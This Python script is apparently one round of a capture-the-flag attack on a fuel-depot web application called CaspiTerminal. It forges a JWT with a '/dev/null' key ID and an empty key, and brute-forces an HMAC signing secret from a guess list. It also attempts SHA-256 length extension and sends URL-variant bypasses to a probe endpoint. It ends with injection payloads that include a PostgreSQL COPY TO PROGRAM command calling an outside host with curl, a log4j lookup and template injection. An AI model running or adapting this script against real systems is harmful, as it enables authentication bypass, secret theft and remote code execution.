#!/usr/bin/env python3
"""round62 — Test known flags as PROBE_SECRET + pure Python SHA256 length extension + creative last resort"""
import requests, time, json, hmac as hm, hashlib, base64, struct, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

KNOWN_URL = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
KNOWN_SIG_BYTES = bytes.fromhex(KNOWN_SIG)

ALL_SIGS = {
    b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
    b"http://gauge-gw.internal:9100/v1/tanks/1/level": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803",
}

def test_key(key_bytes, label=""):
    sig = hm.new(key_bytes, KNOWN_URL, hashlib.sha256).hexdigest()
    if sig == KNOWN_SIG:
        print(f"\n{'='*60}")
        print(f"*** PROBE_SECRET FOUND: {key_bytes!r} ***")
        print(f"*** Label: {label} ***")
        print(f"{'='*60}")
        # Verify with second sig
        sig2 = hm.new(key_bytes, b"http://gauge-gw.internal:9100/v1/tanks/1/level", hashlib.sha256).hexdigest()
        print(f"  Verify tank-1: {'OK' if sig2 == 'ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803' else 'FAIL'}")
        return True
    return False

# ============================================================
print("="*70)
print("PHASE 1: TEST KNOWN FLAGS AS PROBE_SECRET")
print("="*70)

known_flags = [
    "STF{c8142af02727b3d7d51e4aece866104b}",
    "KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}",
    "c8142af02727b3d7d51e4aece866104b",
    "c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95",
]

for flag in known_flags:
    if test_key(flag.encode(), f"known flag: {flag[:30]}"):
        break
    # Also try hash of flag
    for hfn in [hashlib.md5, hashlib.sha256, hashlib.sha1]:
        h = hfn(flag.encode()).hexdigest()
        if test_key(h.encode(), f"{hfn().name}({flag[:20]})"):
            break
else:
    print("  Known flags don't match as PROBE_SECRET")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: DERIVED KEYS FROM KNOWN DATA")
print("="*70)

# Test many derivations
derivations = [
    # Container/host info
    b"5407f6317f5c",  # hostname
    b"khs-oil-depot",  # docker compose project
    b"172.18.0.5",  # container IP
    b"gauge-gw.internal",
    b"gauge-gw",
    b"terminal-db",
    b"caspiterminal",
    b"CaspiTerminal",
    b"CASPITERMINAL",
    # Port/service related
    b"9000",
    b"9100",
    b"8007",
    b"3000",
    # App-specific
    b"custody-transfer",
    b"loading-arm-1",
    b"oil-depot",
    b"fuel-storage",
    b"mangystau",
    b"aktau",
    b"caspian",
    # LLEHS / challenge related
    b"LLEHS",
    b"llehs",
    b"SHELL",
    b"shell",
    b"reverse-shell",
    b"reverse_shell",
    # Common CTF secrets
    b"flag",
    b"ctf",
    b"KazHackStan",
    b"kazhackstan",
    b"KHS2024",
    b"KHS2025",
    b"KHS2026",
    b"khs2026",
    b"s3cr3t",
    b"sup3rs3cr3t",
    b"pr0b3_s3cr3t",
    b"p@ssw0rd",
    b"P@ssw0rd",
    b"admin",
    b"admin123",
    b"password",
    b"password123",
    b"qwerty",
    b"letmein",
    b"changeme",
    b"default",
    b"master",
    b"dev",
    b"prod",
    b"production",
    b"development",
    b"test",
    b"testing",
    # UUID/hex
    b"00000000000000000000000000000000",
    b"ffffffffffffffffffffffffffffffff",
    b"deadbeef",
    b"cafebabe",
    # Binary single bytes
    b"\x00",
    b"\xff",
    b"\x00" * 16,
    b"\x00" * 32,
    # Docker/gunicorn
    b"gunicorn",
    b"flask",
    b"werkzeug",
    # From DB URL pattern
    b"postgres",
    b"postgresql",
    # Probe-related compound
    b"probe-secret",
    b"probe_secret",
    b"ProbeSecret",
    b"PROBE_SECRET",
    b"probe-signing-key",
    b"probe_signing_key",
    b"hmac-probe",
    b"hmac_probe",
    b"gauge-gw-secret",
    b"gauge-gw-key",
    b"gauge_gw_secret",
    # Base64 of known values
    base64.b64encode(b"probe_secret"),
    base64.b64encode(b"PROBE_SECRET"),
    # Common API keys patterns
    b"sk_live_" + b"0" * 24,
    b"sk_test_" + b"0" * 24,
]

found = False
for key in derivations:
    if test_key(key, f"derived: {key[:40]!r}"):
        found = True
        break
if not found:
    print(f"  Tested {len(derivations)} derivations — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: PURE PYTHON SHA256 LENGTH EXTENSION")
print("="*70)

# SHA256 implementation for length extension
# We need to continue hashing from a known state

def sha256_compress(state, block):
    """SHA256 compression function — one 64-byte block"""
    K = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
        0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
        0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
        0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
        0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
        0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
        0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
        0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
        0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ]

    W = list(struct.unpack('>16I', block))
    for i in range(16, 64):
        s0 = (((W[i-15] >> 7) | (W[i-15] << 25)) ^ ((W[i-15] >> 18) | (W[i-15] << 14)) ^ (W[i-15] >> 3)) & 0xFFFFFFFF
        s1 = (((W[i-2] >> 17) | (W[i-2] << 15)) ^ ((W[i-2] >> 19) | (W[i-2] << 13)) ^ (W[i-2] >> 10)) & 0xFFFFFFFF
        W.append((W[i-16] + s0 + W[i-7] + s1) & 0xFFFFFFFF)

    a, b, c, d, e, f, g, h = state

    for i in range(64):
        S1 = (((e >> 6) | (e << 26)) ^ ((e >> 11) | (e << 21)) ^ ((e >> 25) | (e << 7))) & 0xFFFFFFFF
        ch = ((e & f) ^ (~e & g)) & 0xFFFFFFFF
        temp1 = (h + S1 + ch + K[i] + W[i]) & 0xFFFFFFFF
        S0 = (((a >> 2) | (a << 30)) ^ ((a >> 13) | (a << 19)) ^ ((a >> 22) | (a << 10))) & 0xFFFFFFFF
        maj = ((a & b) ^ (a & c) ^ (b & c)) & 0xFFFFFFFF
        temp2 = (S0 + maj) & 0xFFFFFFFF

        h = g
        g = f
        f = e
        e = (d + temp1) & 0xFFFFFFFF
        d = c
        c = b
        b = a
        a = (temp1 + temp2) & 0xFFFFFFFF

    return tuple((s + v) & 0xFFFFFFFF for s, v in zip(state, (a, b, c, d, e, f, g, h)))

def sha256_pad(msg_len):
    """SHA256 padding for a message of given length"""
    padding = b'\x80'
    padding += b'\x00' * ((55 - msg_len % 64) % 64)
    padding += struct.pack('>Q', msg_len * 8)
    return padding

def sha256_extend(known_hash, orig_msg_len, extension):
    """Given SHA256(unknown_prefix + known_msg) = known_hash,
       compute SHA256(unknown_prefix + known_msg + padding + extension)"""
    # Parse known hash into state
    state = struct.unpack('>8I', bytes.fromhex(known_hash))

    # The padded length is the next multiple of 64 after orig_msg_len + padding
    padded_len = orig_msg_len + len(sha256_pad(orig_msg_len))

    # Now we need to hash the extension with this state
    # The extension needs its own padding
    ext_with_pad = extension + sha256_pad(padded_len + len(extension))

    # Process each 64-byte block
    for i in range(0, len(ext_with_pad), 64):
        block = ext_with_pad[i:i+64]
        if len(block) < 64:
            break
        state = sha256_compress(state, block)

    return struct.pack('>8I', *state).hex()

# Test: SHA256(key + url + padding + extension) for various key lengths
print("  Testing SHA256 length extension for key_len 1-64...")

extension = b"AAAA"  # Simple extension to verify
target_url = KNOWN_URL.decode()

for key_len in range(1, 65):
    orig_data_len = key_len + len(KNOWN_URL)
    padding = sha256_pad(orig_data_len)

    # The forged URL would be: original_url + padding + extension
    forged_url_bytes = KNOWN_URL + padding + extension

    # Compute the extended hash
    forged_sig = sha256_extend(KNOWN_SIG, orig_data_len, extension)

    # Test against the server
    # Note: URL has binary data, so encode it appropriately
    try:
        forged_url_str = forged_url_bytes.decode('latin-1')
        r = S.post(f"{CASPI}/api/ops/probe",
                   json={"url": forged_url_str, "sig": forged_sig},
                   headers=AUTH_OP, timeout=3)
        if r.status_code == 200:
            print(f"  *** LENGTH EXTENSION WORKS! key_len={key_len} ***")
            print(f"  *** Response: {r.text[:200]} ***")
            break
        elif r.status_code != 403:
            print(f"  key_len={key_len}: [{r.status_code}]")
    except Exception as e:
        if "timed out" not in str(e):
            pass  # Binary URL might fail
else:
    print("  Length extension attack failed (HMAC, not SHA256+key)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: PROBE WITH URL ENCODING/VARIATIONS")
print("="*70)

# Test: does the server normalize URLs before HMAC check?
# If so, a URL variant might pass HMAC but resolve differently

variations = [
    # Case variations
    ("http://GAUGE-GW.INTERNAL:9100/v1/meters/loading-arm-1/flow", KNOWN_SIG),
    ("http://Gauge-Gw.Internal:9100/v1/meters/loading-arm-1/flow", KNOWN_SIG),
    # Trailing dot (DNS treats same)
    ("http://gauge-gw.internal.:9100/v1/meters/loading-arm-1/flow", KNOWN_SIG),
    # Double slash
    ("http://gauge-gw.internal:9100//v1/meters/loading-arm-1/flow", KNOWN_SIG),
    # URL encoding
    ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flo%77", KNOWN_SIG),
    ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/%66low", KNOWN_SIG),
    # IPv4 notation
    ("http://0x7f000001:9100/v1/meters/loading-arm-1/flow", KNOWN_SIG),
    # Port as part of path
    ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow:9000", KNOWN_SIG),
    # Tab/space injection
    ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow\t", KNOWN_SIG),
    # Backslash
    ("http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow\\", KNOWN_SIG),
]

for var_url, sig in variations:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
                   json={"url": var_url, "sig": sig},
                   headers=AUTH_OP, timeout=3)
        if r.status_code == 200:
            body = r.json().get("body", "")
            print(f"  *** ACCEPTED: {var_url[:60]}: {body[:100]} ***")
        elif r.status_code != 403:
            print(f"  [{r.status_code}] {var_url[:60]}: {r.text[:100]}")
    except:
        pass
print("  All URL variations rejected (strict string comparison)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: INSTALL HASHPUMPY AND RUN")
print("="*70)

import subprocess
try:
    subprocess.run(["pip3", "install", "hashpumpy"], capture_output=True, timeout=30)
    import hashpumpy
    print("  hashpumpy installed!")

    # Test length extension for key_len 1-64
    for key_len in range(1, 65):
        new_hash, new_msg = hashpumpy.hashpump(
            KNOWN_SIG,
            KNOWN_URL.decode(),
            "AAAA",
            key_len
        )
        # new_msg contains original_url + padding + extension
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                       json={"url": new_msg.decode('latin-1'), "sig": new_hash},
                       headers=AUTH_OP, timeout=3)
            if r.status_code == 200:
                print(f"  *** HASHPUMP WORKS! key_len={key_len} ***")
                break
        except:
            pass
    else:
        print("  hashpumpy: no key_len worked (HMAC confirmed)")
except Exception as e:
    print(f"  hashpumpy install/run failed: {e}")

try:
    subprocess.run(["pip3", "install", "hlextend"], capture_output=True, timeout=30)
    import hlextend
    print("  hlextend installed!")

    for key_len in range(1, 65):
        sha = hlextend.new('sha256')
        new_msg = sha.extend("AAAA", KNOWN_URL.decode(), key_len, KNOWN_SIG)
        new_hash = sha.hexdigest()
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                       json={"url": new_msg, "sig": new_hash},
                       headers=AUTH_OP, timeout=3)
            if r.status_code == 200:
                print(f"  *** HLEXTEND WORKS! key_len={key_len} ***")
                break
        except:
            pass
    else:
        print("  hlextend: no key_len worked (HMAC confirmed)")
except Exception as e:
    print(f"  hlextend install/run failed: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: JWT KID → DATABASE URL → SQL INJECTION")
print("="*70)

# What if we use kid to point to /app/db.py content as key,
# then access probe endpoints? The key itself is the db.py content
# This doesn't help directly, but what about kid pointing to
# the DATABASE_URL environment variable?

# Actually — what if we read the database through the app's OWN DB connection?
# The custody/ingest endpoint PARSES XML but ALSO queries/inserts into DB

# Let's see: the response has {"status":"parsed","summary":{...}}
# What if there's a SQL injection in the XML field values
# that are used in a DB query?

# Test: very long values, special SQL chars
sql_payloads = [
    ("' OR '1'='1", "basic SQLi"),
    ("'; SELECT pg_sleep(3);--", "time-based SQLi"),
    ("' UNION SELECT version()--", "union SQLi"),
    ("1; COPY (SELECT * FROM pg_settings) TO PROGRAM 'curl http://x';--", "RCE via COPY"),
    ("' || (SELECT current_setting('probe_secret')) || '", "config extraction"),
    ("${jndi:ldap://x}", "log4j"),
    ("{{7*7}}", "SSTI in XML"),
]

for payload, desc in sql_payloads:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{payload}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    try:
        t0 = time.time()
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        elapsed = time.time() - t0

        if elapsed > 2.5:
            print(f"  *** SLOW ({elapsed:.1f}s) [{desc}]: [{r.status_code}] {r.text[:200]} ***")
        elif r.status_code == 200:
            data = r.json()
            ref = data.get("summary", {}).get("reference", "")
            if ref != payload:
                print(f"  *** DIFFERENT [{desc}]: sent={payload[:30]} got={ref[:200]} ***")
        elif r.status_code == 500:
            print(f"  *** 500 ERROR [{desc}]: {r.text[:200]} ***")
    except requests.exceptions.Timeout:
        print(f"  *** TIMEOUT [{desc}] — possible time-based SQLi! ***")
    except Exception as e:
        print(f"  [{desc}]: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
